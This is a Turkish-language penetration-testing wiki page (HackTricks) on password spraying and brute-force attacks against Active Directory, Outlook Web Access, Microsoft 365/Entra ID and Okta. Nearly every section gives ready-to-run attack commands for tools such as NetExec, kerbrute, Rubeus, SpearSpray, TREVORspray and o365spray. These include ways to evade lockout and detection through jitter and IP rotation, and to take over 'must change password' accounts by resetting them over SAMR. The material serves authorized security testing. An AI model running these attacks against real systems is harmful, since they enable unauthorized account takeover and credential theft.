# Password Spraying / Brute Force

{{#include ../../banners/hacktricks-training.md}}


## **Password Spraying**

Birden fazla **geçerli kullanıcı adı** bulduktan sonra, bulunan her kullanıcıyla en **yaygın parolaları** deneyebilirsiniz (ortamın parola politikasını aklınızda tutun).\
**Varsayılan** olarak **minimum** **parola** **uzunluğu** **7**'dir.

Yaygın kullanıcı adları listeleri de faydalı olabilir: [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Birçok yanlış parola denerseniz bazı hesapların **kilitlenebileceğini** unutmayın (varsayılan olarak 10'dan fazla).

### Parola politikasını alın

Eğer bazı kullanıcı kimlik bilgileriniz varsa veya domain user olarak bir shell'e sahipseniz, **parola politikasını şu şekilde alabilirsiniz**:
```bash
# From Linux
crackmapexec <IP> -u 'user' -p 'password' --pass-pol

enum4linux -u 'username' -p 'password' -P <IP>

rpcclient -U "" -N 10.10.10.10;
rpcclient $>querydominfo

ldapsearch -h 10.10.10.10 -x -b "DC=DOMAIN_NAME,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

# From Windows
net accounts

(Get-DomainPolicy)."SystemAccess" #From powerview
```
### Linux’tan (veya tümünden) Exploitation

- **crackmapexec** kullanarak:
```bash
crackmapexec smb <IP> -u users.txt -p passwords.txt
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
- Hedefli, düşük gürültülü spraying için **NetExec (CME successor)** kullanarak SMB/WinRM üzerinden:
```bash
# Optional: generate a hosts entry to ensure Kerberos FQDN resolution
netexec smb <DC_IP> --generate-hosts-file hosts && cat hosts /etc/hosts | sudo sponge /etc/hosts

# Spray a single candidate password against harvested users over SMB
netexec smb <DC_FQDN> -u users.txt -p 'Password123!' \
--continue-on-success --no-bruteforce --shares

# Validate a hit over WinRM (or use SMB exec methods)
netexec winrm <DC_FQDN> -u <username> -p 'Password123!' -x "whoami"

# Tip: sync your clock before Kerberos-based auth to avoid skew issues
sudo ntpdate <DC_FQDN>
```
- [**kerbrute**](https://github.com/ropnop/kerbrute) (Go) kullanarak
```bash
# Password Spraying
./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com [--dc 10.10.10.10] domain_users.txt Password123
# Brute-Force
./kerbrute_linux_amd64 bruteuser -d lab.ropnop.com [--dc 10.10.10.10] passwords.lst thoffman
```
- [**spray**](https://github.com/Greenwolf/Spray) _**(kilitlenmeleri önlemek için deneme sayısını belirtebilirsiniz):**_
```bash
spray.sh -smb <targetIP> <usernameList> <passwordList> <AttemptsPerLockoutPeriod> <LockoutPeriodInMinutes> <DOMAIN>
```
- [**kerbrute**](https://github.com/TarlogicSecurity/kerbrute) (python) kullanarak - TAVSİYE EDİLMEZ, BAZEN ÇALIŞMAZ
```bash
python kerbrute.py -domain jurassic.park -users users.txt -passwords passwords.txt -outputfile jurassic_passwords.txt
python kerbrute.py -domain jurassic.park -users users.txt -password Password123 -outputfile jurassic_passwords.txt
```
- **Metasploit**'in `scanner/smb/smb_login` modülü ile:

![](<../../images/image (745).png>)

- **rpcclient** kullanarak:
```bash
# https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/
for u in $(cat users.txt); do
rpcclient -U "$u%Welcome1" -c "getusername;quit" 10.10.10.10 | grep Authority;
done
```
#### Windows'tan

- brute module içeren [Rubeus](https://github.com/Zer1t0/Rubeus) sürümüyle:
```bash
# with a list of users
.\Rubeus.exe brute /users:<users_file> /passwords:<passwords_file> /domain:<domain_name> /outfile:<output_file>

# check passwords for all users in current domain
.\Rubeus.exe brute /passwords:<passwords_file> /outfile:<output_file>
```
- [**Invoke-DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray/blob/master/DomainPasswordSpray.ps1) ile (Varsayılan olarak domain içinden kullanıcıları oluşturabilir ve domain'den parola politikasını alıp deneme sayısını buna göre sınırlar):
```bash
Invoke-DomainPasswordSpray -UserList .\users.txt -Password 123456 -Verbose
```
- [**Invoke-SprayEmptyPassword.ps1**](https://github.com/S3cur3Th1sSh1t/Creds/blob/master/PowershellScripts/Invoke-SprayEmptyPassword.ps1) ile
```
Invoke-SprayEmptyPassword
```
### "Password must change at next logon" Hesaplarını Tespit Et ve Ele Geçir (SAMR)

Düşük gürültülü bir teknik, zararsız/boş bir password spray yapmak ve STATUS_PASSWORD_MUST_CHANGE döndüren hesapları yakalamaktır; bu, password’un zorla süresi dolduğu ve eskiyi bilmeden değiştirilebildiği anlamına gelir.

Workflow:
- Hedef listesini oluşturmak için kullanıcıları enumerate edin (SAMR üzerinden RID brute):

{{#ref}}
../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
{{#endref}}
```bash
# NetExec (null/guest) + RID brute to harvest users
netexec smb <dc_fqdn> -u '' -p '' --rid-brute | awk -F'\\\\| ' '/SidTypeUser/ {print $3}' > users.txt
```
- Boş bir password ile spray yapın ve next logon sırasında change etmesi gereken hesapları capture etmek için hitlerde devam edin:
```bash
# Will show valid, lockout, and STATUS_PASSWORD_MUST_CHANGE among results
netexec smb <DC.FQDN> -u users.txt -p '' --continue-on-success
```
- Her isabet için, NetExec’in modülü ile SAMR üzerinden parolayı değiştirin ("must change" ayarlı olduğunda eski parola gerekmez):
```bash
# Strong complexity to satisfy policy
env NEWPASS='P@ssw0rd!2025#' ; \
netexec smb <DC.FQDN> -u <User> -p '' -M change-password -o NEWPASS="$NEWPASS"

# Validate and retrieve domain password policy with the new creds
netexec smb <DC.FQDN> -u <User> -p "$NEWPASS" --pass-pol
```
Operasyonel notlar:
- Kerberos tabanlı işlemlerden önce host saatinizin DC ile senkronize olduğundan emin olun: `sudo ntpdate <dc_fqdn>`.
- Bazı modüllerde (örn. RDP/WinRM) (Pwn3d!) olmadan görünen bir [+], kimlik bilgilerinin geçerli olduğu ancak hesabın interaktif oturum açma haklarına sahip olmadığı anlamına gelir.

## Brute Force
```bash
legba kerberos --target 127.0.0.1 --username admin --password wordlists/passwords.txt --kerberos-realm example.org
```
### Kerberos pre-auth spraying with LDAP targeting and PSO-aware throttling (SpearSpray)

Kerberos pre-auth tabanlı spraying, SMB/NTLM/LDAP bind denemelerine göre daha az gürültü üretir ve AD lockout politikalarıyla daha iyi uyum sağlar. SpearSpray, LDAP tabanlı hedefleme, bir pattern engine ve policy awareness (domain policy + PSOs + badPwdCount buffer) ile precise ve safe bir şekilde spraying yapar. Ayrıca BloodHound pathing için Neo4j içinde compromised principals etiketleyebilir.

Temel fikirler:
- Paged LDAP user discovery ve LDAPS desteği, isteğe bağlı custom LDAP filters kullanımı.
- Domain lockout policy + PSO-aware filtering ile yapılandırılabilir bir attempt buffer (threshold) bırakmak ve kullanıcıları lock etmemek.
- Hızlı gssapi bindings kullanarak Kerberos pre-auth validation (DC’lerde 4625 yerine 4768/4771 üretir).
- Her kullanıcı için names ve her kullanıcının pwdLastSet değerinden türetilen temporal values gibi variables kullanan, pattern-based password generation.
- threads, jitter ve max requests per second ile throughput control.
- Owned users’ı BloodHound için işaretlemek üzere opsiyonel Neo4j integration.

Temel kullanım ve discovery:
```bash
# List available pattern variables
spearspray -l

# Basic run (LDAP bind over TCP/389)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local

# LDAPS (TCP/636)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local --ssl
```
Hedefleme ve pattern control:
```bash
# Custom LDAP filter (e.g., target specific OU/attributes)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local \
-q "(&(objectCategory=person)(objectClass=user)(department=IT))"

# Use separators/suffixes and an org token consumed by patterns via {separator}/{suffix}/{extra}
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -sep @-_ -suf !? -x ACME
```
Stealth ve safety kontrolleri:
```bash
# Control concurrency, add jitter, and cap request rate
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -t 5 -j 3,5 --max-rps 10

# Leave N attempts in reserve before lockout (default threshold: 2)
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -thr 2
```
Neo4j/BloodHound enrichment:
```bash
spearspray -u pentester -p Password123 -d fabrikam.local -dc dc01.fabrikam.local -nu neo4j -np bloodhound --uri bolt://localhost:7687
```
Desen sistemine genel bakış (patterns.txt):
```text
# Example templates consuming per-user attributes and temporal context
{name}{separator}{year}{suffix}
{month_en}{separator}{short_year}{suffix}
{season_en}{separator}{year}{suffix}
{samaccountname}
{extra}{separator}{year}{suffix}
```
Kullanılabilir değişkenler:
- {name}, {samaccountname}
- Her kullanıcının pwdLastSet değerinden (veya whenCreated) alınan zaman bilgisi: {year}, {short_year}, {month_number}, {month_en}, {season_en}
- Composition helpers ve org token: {separator}, {suffix}, {extra}

Operasyonel notlar:
- En yetkili badPwdCount ve policy ile ilgili bilgileri okumak için -dc ile PDC-emulator sorgulamayı tercih edin.
- badPwdCount resetleri, gözlem penceresinden sonraki bir sonraki denemede tetiklenir; safe kalmak için threshold ve timing kullanın.
- Kerberos pre-auth denemeleri DC telemetry’de 4768/4771 olarak görünür; karışmak için jitter ve rate-limiting kullanın.

> İpucu: SpearSpray’in varsayılan LDAP page size değeri 200’dür; gerektiğinde -lps ile ayarlayın.

## Outlook Web Access

Outlook için p**assword spraying** yapmaya yarayan birden fazla araç vardır.

- [MSF Owa_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_login/) ile
- [MSF Owa_ews_login](https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login/) ile
- [Ruler](https://github.com/sensepost/ruler) (güvenilir!)
- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) (Powershell)
- [MailSniper](https://github.com/dafthack/MailSniper) (Powershell)

Bu araçlardan herhangi birini kullanmak için, bir kullanıcı listesine ve spray etmek için bir parola / küçük bir parola listesine ihtiyacınız vardır.
```bash
./ruler-linux64 --domain reel2.htb -k brute --users users.txt --passwords passwords.txt --delay 0 --verbose
[x] Failed: larsson:Summer2020
[x] Failed: cube0x0:Summer2020
[x] Failed: a.admin:Summer2020
[x] Failed: c.cube:Summer2020
[+] Success: s.svensson:Summer2020
```
## Microsoft 365 / Entra ID

Cloud spraying için önce tenant’ın **managed**, **federated** veya **hybrid** olup olmadığını belirleyin, çünkü endpoint ve lockout davranışı on-prem AD’den farklı olabilir. Microsoft Entra’da **Smart Lockout**, tekrarlanan denemelerin lockout bütçesini nasıl tükettiğini değiştirir:

- Aynı **bad password**’ü tekrarlamak lockout sayacını artırmaya devam etmez, ancak **yeni candidates** denemek artırır.
- **Familiar** ve **unfamiliar** konumların **ayrı** sayaçları vardır.
- **pass-through authentication (PTA)** kullanan tenant’lar bad-password hash tracking avantajından yararlanmaz, bu yüzden onları klasik lockout-sensitive hedefler gibi değerlendirin.

Pratikte, round başına **tek password** spray edin, round’lar arasında yeterli boşluk bırakın ve tahmin göndermeden önce tenant’ın gerçek auth flow’unu keşfedebilen tooling’i tercih edin.

- [**TREVORspray**](https://github.com/blacklanternsecurity/TREVORspray) ile tenant’ı recon edebilir, `token_endpoint`’i keşfedebilir, `msol`/`adfs`/`owa`/`okta` spray edebilir ve trafiği birden fazla egress IP üzerinden rotate edebilirsiniz:
```bash
# Enumerate tenant info, autodiscover, and the token endpoint
trevorspray --recon corp.com

# Spray against the discovered token endpoint with delay/jitter
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--delay 5 --jitter 3 --lockout-delay 60

# Round-robin between multiple SSH egress points
trevorspray -u users.txt -p 'Winter2025!' \
--url https://login.windows.net/<tenant-id>/oauth2/token \
--ssh root@1.2.3.4 root@4.3.2.1 --delay 5
```
- [**Spray365**](https://github.com/MarkoH17/Spray365) ile yeniden sürdürülebilir bir **execution plan** önceden oluşturabilir, auth sırasını rastgele hale getirebilir ve lockout penceresinin dışında kalmak için kullanıcı başına **minimum delay** uygulayabilirsiniz:
```bash
# Generate a plan with shuffled auth order and a per-user minimum delay
python3 spray365.py generate normal -ep plan.s365 -d corp.com \
-u users.txt -pf passwords.txt --delay 30 -mD 1800 \
-S -rUA

# Execute the plan and abort after observing several lockouts
python3 spray365.py spray -ep plan.s365 -l 5
```
- [**o365spray**](https://github.com/0xZDH/o365spray) ile tenant doğrulaması yapabilir, `onedrive` gibi modüllerle kullanıcıları enumerate edebilir ve **kilitlenme penceresi** başına kullanıcı başına **tek deneme** olacak şekilde `oauth2` veya `adfs` üzerinden spray yapabilirsiniz. Zaten bir FireProx API’niz varsa, kaynak IP’leri dağıtmak için bunu `--proxy-url` ile geçin:
```bash
o365spray --validate --domain corp.com
o365spray --enum -U users.txt --domain corp.com --enum-module onedrive
o365spray --spray -U valid.txt -P passwords.txt --count 1 --lockout 15 --domain corp.com
```
Son operator tradecraft ayrıca **distributed cloud spraying** yönüne kaydı. [**TeamFiltration**](https://github.com/Flangvik/TeamFiltration), zaman pencerelerini, password shuffling'i, ADFS/M365 spraying'i ve otomatik post-auth exfiltration'ı destekler. Gerçek dünyadaki yakın tarihli kötüye kullanım ayrıca spray dalgalarını birden fazla kaynak coğrafyaya yaymak için **Microsoft Teams API** hesap enumaration'ını ve **AWS region rotation**'ı kullandı.

## Google

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)

## Okta

- [https://github.com/ustayready/CredKing/blob/master/credking.py](https://github.com/ustayready/CredKing/blob/master/credking.py)
- [https://github.com/Rhynorater/Okta-Password-Sprayer](https://github.com/Rhynorater/Okta-Password-Sprayer)
- [https://github.com/knavesec/CredMaster](https://github.com/knavesec/CredMaster)

## References

- [https://github.com/sikumy/spearspray](https://github.com/sikumy/spearspray)
- [https://github.com/TarlogicSecurity/kerbrute](https://github.com/TarlogicSecurity/kerbrute)
- [https://github.com/Greenwolf/Spray](https://github.com/Greenwolf/Spray)
- [https://github.com/Hackndo/sprayhound](https://github.com/Hackndo/sprayhound)
- [https://github.com/login-securite/conpass](https://github.com/login-securite/conpass)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-password-spraying)
- [https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell](https://www.ired.team/offensive-security/initial-access/password-spraying-outlook-web-access-remote-shell)
- [www.blackhillsinfosec.com/?p=5296](https://www.blackhillsinfosec.com/?p=5296)
- [https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying](https://hunter2.gitbook.io/darthsidious/initial-access/password-spraying)
- [Microsoft Entra smart lockout](https://learn.microsoft.com/en-us/entra/identity/authentication/howto-password-smart-lockout)
- [Proofpoint: Attackers Unleash TeamFiltration: Account Takeover Campaign](https://www.proofpoint.com/us/blog/threat-insight/attackers-unleash-teamfiltration-account-takeover-campaign)
- [HTB Sendai – 0xdf: from spray to gMSA to DA/SYSTEM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
